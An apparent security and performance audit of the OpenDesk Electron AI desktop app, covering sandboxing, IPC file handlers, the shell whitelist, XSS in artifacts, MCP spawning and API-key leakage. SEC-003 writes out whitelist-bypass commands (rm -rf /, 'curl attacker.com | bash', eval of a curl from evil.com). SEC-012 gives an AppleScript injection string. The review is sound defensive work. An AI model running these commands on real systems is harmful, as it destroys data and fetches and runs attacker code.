# OpenDesk Security & Performance Review

**Project:** frankfika/OpenDesk  
**Branch:** main  
**Electron Version:** 31.0.1  
**Review Date:** 2026-06-19  
**Scope:** Main process IPC handlers, preload bridge, renderer stores, tool execution, artifact rendering, MCP bridge, provider handling, and desktop control  

---

## Executive Summary

This review identifies **8 Critical security findings** and **3 Critical performance findings** that require immediate remediation before any production or wide distribution. The most severe issues are: (1) `sandbox: false` on the main BrowserWindow combined with overly permissive IPC handlers, (2) arbitrary filesystem read/write access exposed to the renderer with no path validation, (3) a shell-command whitelist that is trivially bypassable to achieve arbitrary code execution, and (4) XSS vectors in artifact rendering. On the performance side, the lack of virtual scrolling and O(n²) message list rendering will degrade to unusable levels beyond a few hundred messages.

---

## Part A — Security Findings

### 🔴 CRITICAL

#### SEC-001: `sandbox: false` on Main BrowserWindow
**Location:** `src/main/index.ts:29`  
**Severity:** Critical | CVSS ~8.1 (High)  
**Description:** The main application window is created with `sandbox: false`. While `contextIsolation: true` and `nodeIntegration: false` are set correctly, disabling the Chromium sandbox means a renderer-process compromise (via XSS in markdown, a malicious artifact, or a compromised dependency) grants the attacker the full OS-level privileges of the running user. In Electron, `sandbox: false` is strongly discouraged for any application processing untrusted content.

```typescript
// src/main/index.ts:27-31
webPreferences: {
  preload: join(__dirname, '../preload/index.js'),
  sandbox: false,        // ← CRITICAL: disables renderer sandbox
  contextIsolation: true,
  nodeIntegration: false
}
```

**Rationale:** With `sandbox: false`, any renderer exploit (e.g., a zero-day in V8, a compromised npm package, or XSS from AI-generated HTML) can immediately access the filesystem, network, and spawn processes without needing a sandbox escape. This is the single most impactful security decision in the app.

**Remediation:**
```typescript
webPreferences: {
  preload: join(__dirname, '../preload/index.js'),
  sandbox: true,           // Enable Chromium sandbox
  contextIsolation: true,
  nodeIntegration: false
}
```
> Note: Enabling `sandbox: true` may require moving any Node.js-dependent logic from the preload script to the main process. The preload currently only uses `ipcRenderer`, which is compatible with sandbox.

---

#### SEC-002: IPC File Tool Handlers Allow Arbitrary Filesystem Access (No Path Validation)
**Location:** `src/main/ipc/handlers.ts:864-867`  
**Severity:** Critical | CVSS ~8.5 (High)  
**Description:** The `tools:readFile`, `tools:writeFile`, `tools:listDirectory`, and `tools:applyPatch` IPC handlers directly delegate to `file-tools.ts` with **zero path validation**. The renderer can read `/etc/passwd`, write to `~/.bashrc`, or overwrite any application binary. These are exposed in the preload (`preload/index.ts:186-195`) and called from the renderer (`InputBar.tsx:529`, `InputBar.tsx:755`).

```typescript
// src/main/ipc/handlers.ts:864-867
ipcMain.handle('tools:readFile', (_e, path: string) => readFile(path))
ipcMain.handle('tools:writeFile', (_e, path: string, content: string) => writeFileTool(path, content))
ipcMain.handle('tools:listDirectory', (_e, path: string) => listDirectory(path))
ipcMain.handle('tools:applyPatch', (_e, path: string, patch: string) => applyPatch(path, patch))
```

**Rationale:** Even with `contextIsolation: true`, a compromised renderer (e.g., via XSS from a malicious webpage opened by the user, or a compromised dependency) can invoke these IPC handlers and exfiltrate or modify any file on the system. The `writeFile` tool even creates missing directories recursively, enabling full filesystem traversal.

**Remediation:** Remove these IPC handlers entirely. The renderer should NEVER have direct filesystem access. File reads for `@file:` mentions should be handled through the main chat pipeline (which already validates paths via `executeTool`), not through direct renderer IPC. If direct file access is absolutely needed for UI features, implement a tightly scoped whitelist:

```typescript
// REMOVED: These handlers should not exist
// ipcMain.handle('tools:readFile', ...)
// ipcMain.handle('tools:writeFile', ...)
// ipcMain.handle('tools:listDirectory', ...)
// ipcMain.handle('tools:applyPatch', ...)

// If workspace file browsing is needed, expose ONLY this:
ipcMain.handle('workspace:scanFiles', async (_e, workspaceId: string, relativePath: string) => {
  const wsPath = getWorkspacePath(workspaceId);
  if (!wsPath) return { error: 'No workspace' };
  const target = resolve(join(wsPath, relativePath));
  if (!isPathAllowed(target, wsPath)) return { error: 'Path outside workspace' };
  return listDirectory(target);
});
```

---

#### SEC-003: Shell Command Whitelist is Trivially Bypassable → Arbitrary Code Execution
**Location:** `src/main/tools/builtins.ts:128-155` (shell tool validation)  
**Severity:** Critical | CVSS ~9.0 (Critical)  
**Description:** The `shell` tool attempts to restrict commands with a whitelist (`SHELL_WHITELIST`) and a blocked-character regex (`/[;&\`$]/`). This is fundamentally flawed. The whitelist contains `bash`, `sh`, `python`, `python3`, `node`, `eval`, `exec`, `ruby`, `perl`, `php`, `ssh`, `curl`, `wget`, and dozens of other commands that can be used to execute arbitrary code. The blocked-character regex misses `"`, `'`, `>`, `<`, `|`, `(`, `)`, `{`, `}`, `\`, and newlines.

```typescript
// src/main/tools/builtins.ts:128-133
const blockedChars = /[;&\`$]/
if (blockedChars.test(command)) {
  return { valid: false, error: 'Command contains blocked characters (; & \` $)' }
}

// src/main/tools/builtins.ts:143-151
const pipeline = command.split('|').map((c) => c.trim())
for (const cmd of pipeline) {
  const firstWord = cmd.split(/\s+/)[0]
  if (!SHELL_WHITELIST.has(firstWord)) { ... }
}
```

**Bypass examples that pass validation:**
- `bash -c "rm -rf /"` → `bash` is whitelisted, no blocked chars.
- `python -c 'import os; os.system("rm -rf /")'` → `python` is whitelisted.
- `node -e "require('child_process').exec('rm -rf /')"` → `node` is whitelisted.
- `sh -c 'curl attacker.com | bash'` → `sh` and `curl` are whitelisted, `|` is the pipeline delimiter (explicitly allowed).
- `eval "$(curl -s https://evil.com/p)"` → `eval` is whitelisted, no blocked chars.

**Rationale:** Whitelist-based shell security is notoriously difficult. Including interpreters (`bash`, `python`, `node`, `ruby`, `perl`, `php`) in the whitelist makes the entire whitelist meaningless. This is a direct arbitrary code execution vector.

**Remediation:** Remove the `shell` tool entirely, or replace it with a strictly sandboxed alternative:

1. **Immediate fix:** Remove `bash`, `sh`, `python`, `python3`, `node`, `ruby`, `perl`, `php`, `eval`, `exec`, `ssh`, `curl`, `wget`, `scp`, `rsync`, `nc`, `netcat`, `telnet`, and any interpreter from the whitelist. Even then, whitelist-based shell security is fragile.

2. **Proper fix:** Remove the `shell` tool from the built-in tools. If shell execution is needed for AI coding assistants, require explicit user approval for every command (SEC-009), and execute commands in a restricted, temporary container or chroot.

3. **Best practice:** Replace `exec` with `execFile` (no shell parsing) and validate each argument individually. But even then, do not allow arbitrary command execution from AI models without explicit per-command user confirmation.

---

#### SEC-004: XSS in SVG and Mermaid Artifact Rendering
**Location:** `src/renderer/src/components/artifacts/ArtifactRenderer.tsx:182-183` (Mermaid), `ArtifactRenderer.tsx:243` (SVG)  
**Severity:** Critical | CVSS ~7.5 (High)  
**Description:** Both the Mermaid and SVG artifact renderers use React's `dangerouslySetInnerHTML` to inject user-provided (or AI-generated) SVG content directly into the DOM. SVG can contain `<script>` tags, event handlers (`onload`, `onerror`), and external resource references that execute JavaScript in the parent renderer context.

```tsx
// ArtifactRenderer.tsx:181-183 (Mermaid)
<div
  ref={containerRef}
  dangerouslySetInnerHTML={{ __html: svg }}
  style={{ transform: `scale(${scale})`, ... }}
/>

// ArtifactRenderer.tsx:242-244 (SVG)
<div
  dangerouslySetInnerHTML={{ __html: content }}
  style={{ transform: `scale(${scale})`, ... }}
/>
```

**Rationale:** AI-generated SVG content is untrusted. An attacker (or a compromised AI model) can embed JavaScript in SVG that executes in the renderer context, stealing settings, API keys, or exfiltrating data. Since `sandbox: false` is set (SEC-001), this XSS can escalate to full system compromise.

**Remediation:**
- For SVG: Render inside a sandboxed `<iframe>` with `sandbox="allow-scripts"` (or better, `sandbox=""` if no interactivity is needed) and `srcdoc` containing the SVG. Alternatively, use a library like `DOMPurify` to sanitize the SVG before injection.
- For Mermaid: The `mermaid.render()` output should be sanitized with `DOMPurify` before `dangerouslySetInnerHTML`. Configure DOMPurify to strip `<script>` tags and event handlers from SVG.

```typescript
// Example using DOMPurify
import DOMPurify from 'dompurify';

const cleanSvg = DOMPurify.sanitize(svg, {
  USE_PROFILES: { svg: true, svgFilters: true }
});
// Then use dangerouslySetInnerHTML with cleanSvg
```

---

#### SEC-005: Artifact iframe `sandbox="allow-scripts"` is Overly Permissive
**Location:** `src/renderer/src/components/artifacts/ArtifactRenderer.tsx:96-102`  
**Severity:** Critical | CVSS ~7.0 (High)  
**Description:** HTML and React artifacts are rendered in an iframe with `sandbox="allow-scripts"`. This allows arbitrary JavaScript execution within the iframe, including crypto mining, data exfiltration via `window.top.postMessage`, navigation hijacking, and other malicious behavior. The iframe loads CDN resources (`unpkg.com`) which could be compromised or manipulated by a determined attacker.

```tsx
// ArtifactRenderer.tsx:96-102
<iframe
  ref={iframeRef}
  srcDoc={srcdoc()}
  sandbox="allow-scripts"   // ← allows arbitrary JS, form submission, navigation
  className="w-full h-full rounded-lg border border-[var(--border)] bg-white"
/>
```

**Rationale:** While `allow-scripts` without `allow-same-origin` prevents cookie/localStorage access, it still allows scripts to perform network requests, CPU abuse, and UI manipulation. AI-generated HTML artifacts should be treated as untrusted code.

**Remediation:** Restrict the sandbox further. If interactivity is needed, use `sandbox="allow-scripts allow-same-origin"` but add a strong CSP inside the iframe's `srcdoc`. If interactivity is not needed, use `sandbox=""` (most restrictive):

```tsx
// For non-interactive HTML previews:
sandbox=""  // No scripts at all

// For interactive React/HTML previews (if absolutely needed):
sandbox="allow-scripts"
// AND inject a strict CSP into the srcdoc:
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' https://unpkg.com; style-src 'unsafe-inline'; img-src data: blob:;">
```

Also consider: Do not allow AI-generated HTML to load external CDN resources. Bundle React and Babel locally, or use a server-side rendering approach.

---

#### SEC-006: MCP Client Spawns Arbitrary Commands with No Sandboxing
**Location:** `src/main/mcp/client.ts:85`  
**Severity:** Critical | CVSS ~8.8 (High)  
**Description:** The MCP client uses `spawn(this.config.command, this.config.args, ...)` to execute arbitrary MCP server binaries with no validation, sandboxing, or permission model. The MCP server configuration (`command` and `args`) is user-provided via the settings UI. An attacker who can modify settings (or trick a user into importing a malicious MCP config) can execute any binary on the system.

```typescript
// src/main/mcp/client.ts:85
this.process = spawn(this.config.command, this.config.args, {
  env: { ...process.env, ...this.config.env },
  stdio: ['pipe', 'pipe', 'pipe']
})
```

**Rationale:** MCP servers are designed to run arbitrary tools on behalf of the AI. They have the same privileges as the main Electron process. There is no isolation: an MCP server can read `~/.opendesk/keys.bin`, access the network, modify files, or install malware. The `env` merge also means MCP servers inherit the entire parent environment, including any sensitive environment variables.

**Remediation:**
1. **Validate MCP server commands:** Restrict `command` to an absolute path and verify the binary exists. Reject relative paths and shell metacharacters.
2. **Sandbox MCP servers:** Use `spawn` with a minimal `env` (whitelist only necessary variables), run in a chroot/container if possible, or at minimum restrict `cwd` to a temporary directory.
3. **Isolated execution:** Consider running MCP servers in a separate Node.js process with limited permissions, or use a dedicated worker thread.
4. **User warning:** Display a prominent warning when adding an MCP server: "This server will run arbitrary commands on your computer. Only add servers from trusted sources."
5. **Restrict to allowed directories:** Do not allow MCP server binaries from `~/Downloads`, `/tmp`, or other untrusted locations.

---

#### SEC-007: Desktop Tools Bypass `desktopEnabled` Gate via Direct IPC
**Location:** `src/main/ipc/handlers.ts:830-833` (capture), `src/main/ipc/handlers.ts:821-828` (openPath), `src/main/ipc/handlers.ts:845-856` (getWindows)  
**Severity:** Critical | CVSS ~7.5 (High)  
**Description:** While `executor.ts` correctly checks `desktopEnabled` before executing desktop tools via the AI pipeline, the direct IPC handlers for desktop operations are **always available** regardless of the `desktopEnabled` setting:

- `desktop:capture` → screenshot anytime
- `desktop:openPath` → open any file/folder
- `desktop:getWindows` → enumerate all windows
- `desktop:emergencyStop` → this one is fine, but still ungated

```typescript
// src/main/ipc/handlers.ts:830-833
ipcMain.handle('desktop:capture', async () => {
  const base64 = await captureScreenshot()
  return base64
})
```

**Rationale:** A compromised renderer can capture screenshots, open malicious applications, and enumerate window titles (potentially leaking sensitive information) even when the user has explicitly disabled desktop control in settings.

**Remediation:** Add the `desktopEnabled` check to all desktop IPC handlers:

```typescript
ipcMain.handle('desktop:capture', async () => {
  if (!settings.desktopEnabled) {
    throw new Error('Desktop control is disabled in Settings')
  }
  return captureScreenshot()
})

ipcMain.handle('desktop:openPath', async (_e, filePath: string) => {
  if (!settings.desktopEnabled) {
    throw new Error('Desktop control is disabled in Settings')
  }
  // Also validate path is within workspace or user-allowed scope
  return shell.openPath(filePath)
})
```

---

#### SEC-008: API Key Exfiltration via `testProvider` and `fetchModels`
**Location:** `src/main/ipc/handlers.ts:340-356` (testProvider), `src/main/ipc/handlers.ts:365-367` (fetchModels), `src/renderer/src/store/settings.ts:90-98` (saveApiKey/getApiKey)  
**Severity:** Critical | CVSS ~7.8 (High)  
**Description:** Two IPC handlers allow the renderer to send API keys to arbitrary URLs:

1. `settings:testProvider` accepts a user-controlled `baseUrl` and sends the `apiKey` to it.
2. `settings:fetchModels` accepts a user-controlled `baseUrl` and sends the `apiKey` in the Authorization header.

Additionally, `settings:getApiKey` returns the plaintext API key to the renderer, making exfiltration trivial for any compromised renderer.

```typescript
// src/main/ipc/handlers.ts:365-367
ipcMain.handle('settings:fetchModels', async (_e, type: string, apiKey?: string, baseUrl?: string) => {
  return fetchModels(type, baseUrl, apiKey)  // baseUrl is user-controlled
})

// fetchModels (line 239): user-controlled URL with API key
const url = (baseUrl || 'https://api.openai.com/v1').replace(/\/$/, '') + '/models'
const headers: Record<string, string> = {}
if (apiKey) headers['Authorization'] = `Bearer ${apiKey}`
const res = await fetch(url, { headers, signal: AbortSignal.timeout(8000) })
```

**Rationale:** If the renderer is compromised, it can call `settings:getApiKey` to steal all keys, then call `settings:testProvider` or `settings:fetchModels` with a malicious `baseUrl` to exfiltrate them to an attacker-controlled server. Even without renderer compromise, the `getApiKey` handler means keys are trivially accessible in the renderer process memory.

**Remediation:**
1. **Remove `settings:getApiKey` from the preload.** The renderer should never have access to plaintext API keys. Keys should only be used in the main process.
2. **Validate URLs:** In `fetchModels` and `testProvider`, validate that `baseUrl` is a valid HTTPS URL with a known hostname. Reject `file://`, `ftp://`, IP addresses, and localhost (unless explicitly allowed for Ollama).
3. **Never pass keys to user-controlled URLs:** Only send API keys to the provider's official endpoints. For Ollama, default to `http://localhost:11434` but do not accept arbitrary base URLs for authenticated providers.

```typescript
// Example URL validation
function isValidProviderUrl(url: string, providerType: string): boolean {
  try {
    const u = new URL(url);
    if (providerType === 'ollama') return u.protocol === 'http:' || u.protocol === 'https:';
    return u.protocol === 'https:' && !u.hostname.match(/^\d+\.\d+\.\d+\.\d+$/);
  } catch { return false; }
}
```

---

### 🟡 WARNING

#### SEC-009: `approvalMode` is Defined but Never Enforced
**Location:** `src/main/ipc/handlers.ts:72` (default `approvalMode: 'suggest'`), `src/renderer/src/components/chat/InputBar.tsx:15-20` (UI options), `src/main/tools/executor.ts` (no enforcement)  
**Severity:** Warning | CVSS ~6.0 (Medium)  
**Description:** The `AppSettings` type includes `approvalMode` with values `'suggest'`, and the UI shows options like `'ask'`, `'auto-edits'`, `'auto-all'`, and `'bypass'`. However, `executor.ts` does not check `approvalMode` before executing any tool. The `desktopEnabled` check is the only permission gate, and file tools are gated only by `isPathAllowed`. There is no user confirmation dialog for write operations, shell commands, or desktop control.

**Rationale:** Users expect that if they set "Ask before every tool", the app will actually ask. The current behavior silently ignores this setting, which could lead to unintended data loss or security breaches.

**Remediation:** Implement a permission broker in the main process:

```typescript
// In executor.ts, before executing any tool:
async function checkApproval(toolCall: ToolCall, mode: string): Promise<boolean> {
  if (mode === 'bypass') return true;
  if (mode === 'ask') return await showApprovalDialog(toolCall);
  if (mode === 'auto-edits' && toolCall.name.startsWith('file_')) return true;
  if (mode === 'auto-all') return true;
  return await showApprovalDialog(toolCall); // default: ask
}
```

Use `dialog.showMessageBox` from Electron to display a native confirmation dialog with the tool name, arguments, and an "Allow / Deny" choice. Cache the user's decision per session for non-destructive tools.

---

#### SEC-010: `isPathAllowed` Vulnerable to Symlink Traversal and Race Conditions
**Location:** `src/main/ipc/handlers.ts:91-99`, `src/main/tools/executor.ts:21-29`  
**Severity:** Warning | CVSS ~6.5 (Medium)  
**Description:** The `isPathAllowed` function uses `resolve()` and `startsWith()` to enforce workspace boundaries. However:

1. **`resolve()` follows symlinks.** If a workspace contains a symlink pointing outside the workspace (e.g., `ln -s /etc/passwd workspace/leak`), `resolve()` returns the target path. The `startsWith` check would then reject it — but only if the symlink target doesn't also start with the workspace path (e.g., a symlink to a file inside the workspace is fine). However, there's a TOCTOU race: the symlink target can be changed between `resolve()` and the actual file operation.
2. **`startsWith` is vulnerable to path prefix attacks.** If the workspace is `/tmp/work`, a path like `/tmp/workspace` also starts with `/tmp/work` (because `/tmp/work` is a prefix of `/tmp/workspace`). Actually, with `sep` appended (`resolvedWorkspace + sep`), this specific case is handled, but edge cases with Unicode normalization or case-insensitive filesystems (Windows, macOS APFS) remain.
3. **The direct IPC file handlers (SEC-002) don't use `isPathAllowed` at all.**

**Rationale:** Path traversal is a classic vulnerability. The current defense is partially correct but not robust against symlink attacks or the fact that the direct IPC handlers bypass it entirely.

**Remediation:**
1. Use `fs.realpath()` to resolve symlinks, then check the resolved path is within the workspace.
2. Use a proper path containment check with a trailing separator:
   ```typescript
   const realFile = await fs.promises.realpath(filePath);
   const realWorkspace = await fs.promises.realpath(workspacePath);
   const prefix = realWorkspace + (realWorkspace.endsWith(sep) ? '' : sep);
   return realFile === realWorkspace || realFile.startsWith(prefix);
   ```
3. Apply this check to ALL file operations, including the direct IPC handlers (which should be removed per SEC-002).

---

#### SEC-011: Error Messages Leak Internal Paths and Potentially API Keys
**Location:** `src/main/ipc/handlers.ts:728-743`, `src/main/tools/file-tools.ts:10`, `src/main/tools/desktop-tools.ts:264`, `src/main/mcp/client.ts:113-116`  
**Severity:** Warning | CVSS ~5.0 (Medium)  
**Description:** Error messages from file tools include the exact file path that failed. Error messages from MCP include raw stderr. Provider error messages may include API keys (depending on the SDK behavior). These are sent directly to the renderer via `chat:error` IPC.

```typescript
// src/main/ipc/handlers.ts:728-743
} catch (err: unknown) {
  const msg = err instanceof Error ? err.message : String(err)
  // ... error classification ...
  win.webContents.send('chat:error', { message: msg, type })
}
```

**Rationale:** Leaking file paths helps attackers map the filesystem. If an API key is accidentally included in an error message (e.g., "Authentication failed for key sk-abc123..."), it is exposed to the renderer.

**Remediation:** Sanitize error messages before sending to the renderer:

```typescript
function sanitizeError(err: unknown): { message: string; type: string } {
  let msg = err instanceof Error ? err.message : String(err);
  // Remove potential API keys
  msg = msg.replace(/\b(sk-[a-zA-Z0-9]{20,})\b/g, '[REDACTED]');
  msg = msg.replace(/\b[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\b/g, '[REDACTED]');
  // Remove home directory paths
  msg = msg.replace(os.homedir(), '~');
  // Remove absolute paths (keep only basename)
  msg = msg.replace(/\b(?:\/Users\/[^/]+|C:\\\\Users\\\\[^\\]+|\\/home\\/[^/]+)\\/[^\s]*/g, (m) => `[PATH: ${path.basename(m)}]`);
  return { message: msg, type: classifyError(msg) };
}
```

---

#### SEC-012: `desktop-tools.ts` Uses Unsafe String Interpolation for AppleScript
**Location:** `src/main/tools/desktop-tools.ts:26-32`, `src/main/tools/desktop-tools.ts:36-43`, `src/main/tools/desktop-tools.ts:45-57`, `src/main/tools/desktop-tools.ts:72-80`  
**Severity:** Warning | CVSS ~6.0 (Medium)  
**Description:** The desktop control tools construct AppleScript by directly embedding user-controlled `x`, `y`, `text`, `key`, and `title` parameters into script strings. While some escaping is attempted (`replace(/'/g, "'\\''")` and `replace(/"/g, '\\"')`), this is fragile and may be bypassed with crafted input.

```typescript
// src/main/tools/desktop-tools.ts:26-32
const script = `
  tell application "System Events"
    ${action} at {${x}, ${y}}
  end tell
`
await execAsync(`osascript -e '${script.replace(/'/g, "'\\''")}'`)
```

**Rationale:** If `x` or `y` are not numbers (e.g., passed as strings like `"0}; do shell script \"rm -rf /\"; {0"`), the AppleScript could execute arbitrary commands. While the current callers validate `x` and `y` as numbers, the tool itself does not enforce this at the entry point.

**Remediation:**
1. Validate all parameters before constructing AppleScript:
   ```typescript
   if (!Number.isInteger(x) || !Number.isInteger(y)) throw new Error('Invalid coordinates');
   ```
2. Use `osascript`'s `-` (stdin) mode instead of `-e` to avoid shell escaping issues:
   ```typescript
   const { execFile } = require('child_process');
   await execFile('osascript', ['-'], { input: script });
   ```
3. For `desktopType` and `desktopKey`, validate that `text` and `key` contain only printable ASCII characters.

---

#### SEC-013: No URL Validation in `fetchModels` — SSRF Risk
**Location:** `src/main/ipc/handlers.ts:218-249`  
**Severity:** Warning | CVSS ~5.5 (Medium)  
**Description:** The `fetchModels` function accepts a user-controlled `baseUrl` and makes an HTTP request to it with the API key. No validation ensures the URL is a legitimate provider endpoint. An attacker could set `baseUrl` to `http://localhost:22/` (SSH) or `http://169.254.169.254/` (AWS metadata) to perform Server-Side Request Forgery (SSRF).

**Rationale:** SSRF can be used to scan internal networks, access cloud metadata services, or attack internal services. The API key is sent as a Bearer token, making it a valuable exfiltration target.

**Remediation:** Validate `baseUrl` before the fetch:
- Reject non-HTTP/HTTPS schemes
- Reject private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16)
- Reject `localhost` and `*.local` for non-Ollama providers
- Only allow known provider domains (openai.com, anthropic.com, etc.) unless the provider type is explicitly `ollama`

---

#### SEC-014: Memory Store Appends Unsanitized HTML Comments
**Location:** `src/main/memory/store.ts:47`  
**Severity:** Warning | CVSS ~4.0 (Low)  
**Description:** The memory store appends entries as Markdown list items with HTML comments:

```typescript
const line = `- ${entry.content} <!-- source: ${entry.source}, time: ${new Date(entry.timestamp).toISOString()} -->\n`
```

If `entry.content` or `entry.source` contains `-->` or other HTML-breaking sequences, the comment structure is corrupted. More importantly, if this Markdown is later rendered without sanitization, malicious content could be injected. While the current code only reads these files in the main process, future changes might render them in the UI.

**Remediation:** Escape HTML special characters in `entry.content` and `entry.source` before appending, or better, store memory entries as JSON lines instead of Markdown for reliable parsing.

---

### 🔵 INFO

#### SEC-015: CSP Meta Tag Present but Missing on BrowserWindow
**Location:** `src/renderer/index.html:6`  
**Severity:** Info  
**Description:** The HTML file includes a CSP meta tag, which is good. However, the `BrowserWindow` `webPreferences` does not set a CSP via `session.setPermissionRequestHandler` or `webContents.session.webRequest.onHeadersReceived`. The meta tag CSP can be bypassed if the renderer is compromised and modifies the DOM. Additionally, the current CSP (`default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'`) is missing `img-src`, `connect-src`, `font-src`, and `frame-src` directives, which is important for an app that loads external images (screenshots, attachments) and iframes (artifacts).

**Remediation:** Add a comprehensive CSP and consider setting it programmatically:

```typescript
// In main process, after window creation:
win.webContents.session.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': [
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline'; " +  // needed for some libraries
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: blob:; " +
        "connect-src 'self' https://api.openai.com https://api.anthropic.com; " +
        "font-src 'self'; " +
        "frame-src 'self' blob:;"
      ]
    }
  });
});
```

#### SEC-016: Ollama Auto-Detect Has No Validation
**Location:** `src/main/index.ts:73-83`  
**Severity:** Info  
**Description:** The Ollama auto-detection makes an unauthenticated HTTP request to `http://localhost:11434/v1/models`. While this is generally safe, a malicious local service on that port could return fake model names and potentially be selected as a provider.

**Remediation:** After auto-detection, prompt the user to confirm the Ollama provider before making it active. Do not automatically set it as `activeProviderId` without user confirmation.

---

## Part B — Performance Findings

### 🔴 CRITICAL

#### PERF-001: No Virtual Scrolling — Message List Becomes Unusable at Scale
**Location:** `src/renderer/src/components/chat/ChatPanel.tsx:506-578`  
**Severity:** Critical  
**Description:** The chat message list renders all messages in the DOM simultaneously. For conversations with 500+ messages, this causes:
- Excessive DOM nodes (each message has nested elements, markdown, code blocks, tool cards)
- Layout thrashing on every new token (browser recalculates layout for the entire list)
- Memory pressure from keeping all message content in the DOM
- Scroll jank and potential browser crashes

The `AnimatePresence` with `mode="popLayout"` (line 508) makes this worse because Framer Motion measures every element for layout animations.

```tsx
// ChatPanel.tsx:506-578
{messages.length > 0 && (
  <div className="py-6 max-w-3xl mx-auto w-full px-6">
    <AnimatePresence mode="popLayout">
      {messageGroups.map((group, groupIdx) => (
        <div key={group.dateLabel + groupIdx}>
          {group.messages.map((msg, i) => {
            // ... every message rendered in DOM
            const globalIdx = messages.findIndex(m => m.id === msg.id)  // O(n) per message!
            return (
              <motion.div key={msg.id} ...>
                <MessageRow ... />
              </motion.div>
            )
          })}
        </div>
      ))}
    </AnimatePresence>
  </div>
)}
```

**Remediation:** Implement virtual scrolling using `react-window` or `@tanstack/react-virtual`:

```tsx
import { useVirtualizer } from '@tanstack/react-virtual';

function ChatPanel() {
  const parentRef = useRef<HTMLDivElement>(null);
  const flatMessages = useMemo(() => /* flatten groups */, [messageGroups]);
  
  const virtualizer = useVirtualizer({
    count: flatMessages.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 80, // approximate row height
    overscan: 5, // render 5 extra items above/below viewport
  });
  
  return (
    <div ref={parentRef} style={{ overflow: 'auto', height: '100%' }}>
      <div style={{ height: `${virtualizer.getTotalSize()}px`, position: 'relative' }}>
        {virtualizer.getVirtualItems().map((virtualItem) => (
          <div
            key={virtualItem.key}
            style={{
              position: 'absolute',
              top: 0,
              left: 0,
              width: '100%',
              transform: `translateY(${virtualItem.start}px)`,
            }}
          >
            <MessageRow message={flatMessages[virtualItem.index]} />
          </div>
        ))}
      </div>
    </div>
  );
}
```

Also, replace `messages.findIndex(m => m.id === msg.id)` with a precomputed `Map<id, index>` to avoid O(n²) lookups.

---

#### PERF-002: InputBar Chat Listener Effect Has Massive Dependency Array Causing Listener Leaks
**Location:** `src/renderer/src/components/chat/InputBar.tsx:183-267`  
**Severity:** Critical  
**Description:** The `useEffect` that registers all chat IPC listeners has 18 dependencies in its array. When ANY of these dependencies change (which happens frequently during state updates), the effect re-runs: it creates new listeners and returns a cleanup function. However, React's cleanup timing means there can be brief periods where duplicate listeners exist, or if the component unmounts during a render, cleanup may not run correctly.

More importantly, the effect registers ~13 different IPC event listeners. If the cleanup function doesn't fire properly, these listeners accumulate in `ipcRenderer`, causing:
- Memory leaks (each closure captures the current state)
- Duplicate message processing (same token appended multiple times)
- Growing memory usage over time

```tsx
// InputBar.tsx:183-267
useEffect(() => {
  const chat = window.api?.chat;
  if (!chat) return;
  const offToken = chat.onToken((token) => appendToken(token));
  const offToolCall = chat.onToolCall((toolCall) => addToolCall(toolCall));
  // ... 11 more listeners ...
  return () => {
    offToken(); offToolCall(); /* ... */ offEnsembleDone();
  }
}, [appendToken, addToolCall, addToolResult, setStreaming, setError, 
    appendAgentToken, setAgentRunStatus, setAgentMetrics, addAgentToolCall, 
    addAgentToolResult, startArbitration, appendArbitrationToken, 
    finalizeArbitration, completeEnsembleRun])
// ↑ 14 dependencies. Most of these are Zustand setters that are stable,
// but the dependency array forces re-registration if any reference changes.
```

**Rationale:** Zustand store actions are typically stable references, but the explicit dependency array still causes re-evaluation. If any of these dependencies are not stable (e.g., bound functions), the effect re-runs on every render.

**Remediation:** Separate the IPC listener registration into a stable effect with no dependencies, using Zustand's `getState()` to access actions instead of capturing them in closures:

```tsx
useEffect(() => {
  const chat = window.api?.chat;
  if (!chat) return;

  const offToken = chat.onToken((token) => {
    useChatStore.getState().appendToken(token);  // stable, no closure capture
  });
  const offToolCall = chat.onToolCall((toolCall) => {
    useChatStore.getState().addToolCall(toolCall);
  });
  // ... etc for all listeners ...

  return () => {
    offToken();
    offToolCall();
    // ... cleanup all ...
  };
}, []); // EMPTY dependency array — stable for the lifetime of the component
```

> ⚠️ Ensure `useChatStore.getState()` is called inside the callback, not captured at effect registration time. This avoids stale closures entirely.

---

#### PERF-003: Synchronous Disk Writes on Every Settings/Thread Change — No Debouncing in Main Process
**Location:** `src/main/ipc/handlers.ts:157-159` (settings), `src/main/ipc/handlers.ts:194-196` (threads), `src/main/ipc/handlers.ts:212-214` (messages)  
**Severity:** Critical  
**Description:** The main process performs synchronous disk writes (`writeFileSync`) on every settings change, thread update, and message save. There is no debouncing or batching. During rapid operations (e.g., ensemble mode with multiple agents updating thread state, or streaming messages being saved), this causes:
- Main process blocking on I/O
- Potential data corruption if the app crashes mid-write
- Excessive SSD wear

```typescript
// src/main/ipc/handlers.ts:157-159
function saveSettingsToDisk(s: AppSettings): void {
  writeFileSync(getSettingsPath(), JSON.stringify(s, null, 2), 'utf-8')
}

// Called on EVERY settings change, thread update, health check result...
```

Note: The renderer-side `chat.ts` store DOES implement debouncing (600ms) for message saves — this is good. But the main process's `thread:saveMessages` handler still writes synchronously.

**Remediation:** Implement debounced, async writes in the main process:

```typescript
// src/main/ipc/handlers.ts
const pendingWrites = new Map<string, { data: unknown; timeout: ReturnType<typeof setTimeout> }>();

function debouncedWriteToDisk<T>(key: string, path: string, data: T, delay = 500): void {
  const pending = pendingWrites.get(key);
  if (pending) clearTimeout(pending.timeout);
  
  pendingWrites.set(key, {
    data,
    timeout: setTimeout(() => {
      pendingWrites.delete(key);
      writeFileSync(path, JSON.stringify(data, null, 2), 'utf-8');
    }, delay)
  });
}

// For critical writes (e.g., API keys), use immediate write:
function saveKeys(keys: Record<string, string>): void {
  const encrypted = safeStorage.encryptString(JSON.stringify(keys));
  writeFileSync(getKeysPath(), encrypted); // Keep immediate for security
}
```

For `saveSettingsToDisk`, use `debouncedWriteToDisk('settings', getSettingsPath(), s, 500)`.

---

### 🟡 WARNING

#### PERF-004: Token-Per-IPC-Message Streaming Causes Excessive IPC Overhead
